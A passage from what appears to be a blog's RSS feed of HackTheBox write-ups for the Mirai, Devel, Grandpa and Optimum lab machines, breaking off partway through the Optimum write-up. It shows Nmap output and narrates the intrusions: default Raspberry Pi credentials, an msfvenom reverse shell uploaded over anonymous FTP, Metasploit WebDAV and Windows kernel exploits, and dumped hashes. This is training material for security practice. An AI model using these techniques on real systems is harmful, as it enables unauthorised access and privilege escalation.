      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/64">Mirai</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_mirai/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_mirai/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>22/tcp/ssh/OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_defaultcreds">exploit_defaultcreds</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Tue Nov 12 15:49:18 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.mirai/results/10.10.10.48/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.mirai/results/10.10.10.48/scans/xml/_quick_tcp_nmap.xml 10.10.10.48
Increasing send delay for 10.10.10.48 from 0 to 5 due to 275 out of 915 dropped probes since last increase.
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.060s latency).
Scanned at 2019-11-12 15:49:19 PST for 27s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp open  domain  syn-ack ttl 63 dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp open  http    syn-ack ttl 63 lighttpd 1.4.35
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 12 15:49:46 2019 -- 1 IP address (1 host up) scanned in 27.40 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_mirai/openports.png.webp" />  </p>
<p>3. From the HTTP response headers, we find that the HTTP service is running the <a href="https://pi-hole.net/">PiHole</a> project:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_mirai/screenshot01.png.webp" />  </p>
<p>4. We also find an <code>admin</code> directory from the <code>gobuster</code> scan:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_mirai/screenshot02.png.webp" />  </p>
<p>5. Upon visiting the <code>http://10.10.10.48/admin/</code> page, we get the default PiHole dashboard:  </p>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_mirai/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>22/tcp     |  ssh     |  OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp     |  domain  |  dnsmasq 2.76
80/tcp     |  http    |  lighttpd 1.4.35
123/udp    |  ntp     |  NTP v4 (unsynchronized)
1323/tcp   |  upnp    |  Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp  |  http    |  Plex Media Server httpd
32469/tcp  |  upnp    |  Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
</code></pre>
<h4>Files</h4>
<pre><code>http://10.10.10.48/admin/
</code></pre>
<h4>Users</h4>
<pre><code>ssh: pi
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We take hint from the name of this VM, Mirai, referring to the <a href="https://en.wikipedia.org/wiki/Mirai_(malware)">botnet</a> that targeted Internet systems configured with default credentials. Since the target system is running PiHole and by default such systems have a user <code>pi</code> with password <code>raspberry</code>, using this combination gives us interactive access:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_mirai/screenshot04.png.webp" />  </p>
<p>2. We then view contents of the <code>user.txt</code> file:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_mirai/screenshot09.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>pi@raspberrypi&gt; id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
pi@raspberrypi&gt;  
pi@raspberrypi&gt; uname
Linux raspberrypi 3.16.0-4-686-pae #1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
pi@raspberrypi&gt;  
pi@raspberrypi&gt; ifconfig
eth0  Link encap:Ethernet  HWaddr 00:50:56:b9:cc:ee
      inet addr:10.10.10.48  Bcast:10.10.10.255  Mask:255.255.255.0
      inet6 addr: fe80::94e9:d9aa:2889:bf0f/64 Scope:Link
      inet6 addr: dead:beef::e164:151a:f090:2d59/64 Scope:Global
      inet6 addr: fe80::250:56ff:feb9:ccee/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:170849 errors:0 dropped:0 overruns:0 frame:0
      TX packets:159384 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:17335718 (16.5 MiB)  TX bytes:23597380 (22.5 MiB)
      Interrupt:19 Base address:0x2000
pi@raspberrypi&gt;  
pi@raspberrypi&gt; users
root
pi
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. From the output of the <code>id</code> command and also confirming via <code>sudo -l</code>, we know that the user <code>pi</code> is a member of the <code>sudo</code> group. This means we can switch to <code>root</code> and gain elevated privileges:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_mirai/screenshot05.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_mirai/screenshot06.png.webp" />  </p>
<p>2. When trying to vie wthe contents of the <code>root.txt</code> file, we see that the original file has been deleted and a backup exists on the USB drive. We use the <code>df -lh</code> command to find the absolute path for mounted USB drive, find a file in it but it too didn't give us the flag. The original file seems to be deleted from the USB stick which means we need to use some quick forensics to obtain the deleted file:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_mirai/screenshot07.png.webp" />  </p>
<p>3. We try to extract strings from the mounted device file <code>/dev/sdb</code> and find the contents of the original <code>root.txt</code> file:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_mirai/screenshot08.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>pi:$6$SQPHFoql$gSE5qWbZRGHDin4LnFY56sMnQsmvH/o2oIlXv.3KcqVsJCYgJ09R9/Pws88e8yjKgJnaxN3zdq8f5ots1b.......................
</code></pre>
<h3>Credentials</h3>
<pre><code>ssh: pi/raspbe...
</code></pre>
<h3>Flags</h3>
<pre><code>/home/pi/Desktop/user.txt: ff837707441b257a20e3............
/root/root.txt -&gt; /media/usbstick/root.txt: 3d3e483143ff12ec5...............
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/64">https://www.hackthebox.eu/home/machines/profile/64</a>  </li>
<li><a href="https://www.youtube.com/watch?v=SRmvRGUuuno">https://www.youtube.com/watch?v=SRmvRGUuuno</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Devel</title>
      <link>https://7h3ram.github.io/posts/20191105_htb-devel.html</link>
      <guid>https://7h3ram.github.io/posts/20191105_htb-devel.html</guid>
      <pubDate>Tue, 05 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/3">Devel</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_devel/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_devel/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>21/tcp/ftp/Microsoft ftpd</code>: <a href="https://github.com/7h3rAm/writeups#exploit_ftp_anonymous">exploit_ftp_anonymous</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ftp_web_root">exploit_ftp_web_root</a><br />
2. <code>80/tcp/http/Microsoft IIS httpd 7.5</code>: <a href="https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell">exploit_iis_asp_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_windows_ms11_046">privesc_windows_ms11_046</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Tue Nov  5 11:28:16 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.devel/results/10.10.10.5/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.devel/results/10.10.10.5/scans/xml/_quick_tcp_nmap.xml 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.11s latency).
Scanned at 2019-11-05 11:28:18 PST for 60s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  5 11:29:18 2019 -- 1 IP address (1 host up) scanned in 61.93 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_devel/openports.png.webp" />  </p>
<p>3. We find that the FTP service allows <code>anonymous</code> login and it shares directory with IIS server web root. This means we can upload <code>.aspx</code> reverse shell file via FTP and trigger it using the HTTP service:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_devel/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_devel/screenshot02.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>21/tcp  |  ftp   |  Microsoft ftpd
80/tcp  |  http  |  Microsoft IIS httpd 7.5
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We create a reverse shell file using <code>msfvenom</code> and upload it to the FTP server. We then start <code>multi/handler</code> listener to catch the incoming connection and request the uploaded file via web browser to get interactive access on the target system:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_devel/screenshot03.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_devel/screenshot04.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_htb_devel/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_htb_devel/screenshot07.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.5" src="/static/files/posts_htb_devel/screenshot08.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>web@DEVEL&gt; id
iis apppool\web
web@DEVEL&gt;  
web@DEVEL&gt; uname
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
web@DEVEL&gt;  
web@DEVEL&gt; ifconfig
Ethernet adapter Local Area Connection:
 Connection-specific DNS Suffix  . :
 IPv4 Address. . . . . . . . . . . : 10.10.10.5
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.10.10.2
web@DEVEL&gt;  
web@DEVEL&gt; users
Administrator
babis
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We first upload the <code>netcat</code> binary to the target system using the FTP server and use it to get <code>systeminfo</code> output. With this, we can start exploring possible exploits for the target system:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_devel/screenshot06.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_devel/screenshot09.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_htb_devel/screenshot10.png.webp" />  </p>
<p>2. Upon looking for exploits for the target system, we find <a href="https://www.exploit-db.com/exploits/40564">EDB:40564</a> but it needs compilation of source file. We search and find a pre-compiled exploit from the <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046">SecWiki/windows-kernel-exploits</a> project:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_devel/screenshot11.png.webp" />  </p>
<p>3. Once downloaded locally, we need to transfer the exploit file to the target system using the FTP server. Once done, we execute the file and gain elevated privileges:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_devel/screenshot12.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_devel/screenshot13.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.3" src="/static/files/posts_htb_devel/screenshot14.png.webp" />  </p>
<p>4. We can now view the contents of the <code>user.txt.txt</code> and <code>root.txt.txt</code> files to complete the challenge:  </p>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_devel/screenshot15.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_htb_devel/screenshot16.png.webp" />  </p>
<h2>Loot</h2>
<h3>Flags</h3>
<pre><code>c:\Users\babis\Desktop\user.txt.txt: 9ecdd6a3aedf24b415..............
c:\Users\Administrator\Desktop\root.txt.txt: e621a0b5041708797...............
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/3">https://www.hackthebox.eu/home/machines/profile/3</a>  </li>
<li><a href="https://xd3m0n.xyz/htb_devel/">https://xd3m0n.xyz/htb_devel/</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Grandpa</title>
      <link>https://7h3ram.github.io/posts/20191104_htb-grandpa.html</link>
      <guid>https://7h3ram.github.io/posts/20191104_htb-grandpa.html</guid>
      <pubDate>Mon, 04 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/13">Grandpa</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_grandpa/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_grandpa/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Microsoft IIS httpd 6.0</code>: <a href="https://github.com/7h3rAm/writeups#exploit_iis_webdav">exploit_iis_webdav</a>, <a href="https://github.com/7h3rAm/writeups#privesc_windows_ms14_070">privesc_windows_ms14_070</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Mon Nov  4 15:43:14 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.grandpa/results/10.10.10.14/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.grandpa/results/10.10.10.14/scans/xml/_quick_tcp_nmap.xml 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.057s latency).
Scanned at 2019-11-04 15:43:15 PST for 23s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unkown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Mon, 04 Nov 2019 23:43:43 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  4 15:43:38 2019 -- 1 IP address (1 host up) scanned in 23.46 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_grandpa/openports.png.webp" />  </p>
<p>3. We look for IIS 6.0 vulnerabilities and find multiple WebDAV related hits:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_grandpa/screenshot01.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp  |  http  |  Microsoft IIS httpd 6.0
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We decide to use the Metasploit <code>windows/iis/iis_webdav_scstoragepathfromurl</code> exploit and it successully gives us a Meterpreter shell:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_grandpa/screenshot02.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_grandpa/screenshot03.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>ntauth/network@GRANPA&gt; id
NT AUTHORITY\NETWORK SERVICE
ntauth/network@GRANPA&gt;  
ntauth/network@GRANPA&gt; uname
Computer        : GRANPA
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
ntauth/network@GRANPA&gt;  
ntauth/network@GRANPA&gt; ifconfig
Ethernet adapter Local Area Connection:
 Connection-specific DNS Suffix  . :
 IP Address. . . . . . . . . . . . : 10.10.10.14
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.10.10.2
ntauth/network@GRANPA&gt;  
ntauth/network@GRANPA&gt; users
Administrator
Harry
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. Since we have certain restrictions that stop us from running commands like <code>getuid</code>, we have to migrate to a different process. We find the PID for process <code>davcdata.exe</code> and migrate to it:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_grandpa/screenshot04.png.webp" />  </p>
<p>2. We can now use the Metasploit <code>multi/recon/local_exploit_suggester</code> module to look for privesc options:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_grandpa/screenshot05.png.webp" />  </p>
<p>3. We tried a few exploits from this list and eventually the <code>windows/local/ms14_070_tcpip_ioctl</code> module worked and provided an elevated session:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_grandpa/screenshot06.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_grandpa/screenshot07.png.webp" />  </p>
<p>4. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  </p>
<pre><code>cat &quot;C:\Documents and Settings\Harry\Desktop\user.txt&quot;
cat &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
</code></pre>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_grandpa/screenshot08.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>Administrator:500:0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a.................
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f589................
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c...............
Harry:1008:93c50499355883d1441208923e8628e6:031f5563e0ac4ba538e................
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b7.................
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f615.................
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e..................
</code></pre>
<h3>Flags</h3>
<pre><code>C:\Documents and Settings\Harry\Desktop\user.txt: bdff5ec67c3cff01................
C:\Documents and Settings\Administrator\Desktop\root.txt: 9359e905a2c35f..................
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/13">https://www.hackthebox.eu/home/machines/profile/13</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Optimum</title>
      <link>https://7h3ram.github.io/posts/20191104_htb-optimum.html</link>
      <guid>https://7h3ram.github.io/posts/20191104_htb-optimum.html</guid>
      <pubDate>Mon, 04 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/6">Optimum</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_optimum/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_optimum/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/HttpFileServer httpd 2.3</code>: <a href="https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec">exploit_hfs_cmd_exec</a>, <a href="https://github.com/7h3rAm/writeups#privesc_windows_ms16_098">privesc_windows_ms16_098</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Mon Nov  4 17:34:56 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.optimum/results/10.10.10.8/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.optimum/results/10.10.10.8/scans/xml/_quick_tcp_nmap.xml 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.062s latency).
Scanned at 2019-11-04 17:34:57 PST for 19s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  4 17:35:16 2019 -- 1 IP address (1 host up) scanned in 19.87 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_optimum/openports.png.webp" />  </p>
<p>3. We find <code>HttpFileServer 2.3</code> running on the target system. Upon searching for exploits we find multiple hits:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_optimum/screenshot01.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp  |  http  |  HttpFileServer httpd 2.3
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We use the command execution exploit, slightly modify it to print debug information and get interactive access on the target system:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_optimum/screenshot02.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_optimum/screenshot03.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_htb_optimum/screenshot04.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>kostas@OPTIMUM&gt; id
optimum\kostas
kostas@OPTIMUM&gt;  
kostas@OPTIMUM&gt; uname
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
kostas@OPTIMUM&gt;  
kostas@OPTIMUM&gt; ifconfig
Ethernet adapter Ethernet0
 Connection-specific DNS Suffix  . :
 IPv4 Address. . . . . . . . . . . : 10.10.10.8
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.10.10.2
kostas@OPTIMUM&gt;  
kostas@OPTIMUM&gt; users
Administrator
kostas
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We can now view the contents of the <code>user.txt.txt</code> file to get the first flag:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_optimum/screenshot05.png.webp" />  </p>
<p>2. We now use the <code>windows-exploit-suggester.py</code> script to get list of possible privesc vectors. To do this, we first had to download <code>netcat</code> onto target system via Powershell and transfer the text output of <code>systeminfo</code> command to our local system:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_optimum/screenshot06.png.webp" />  </p>
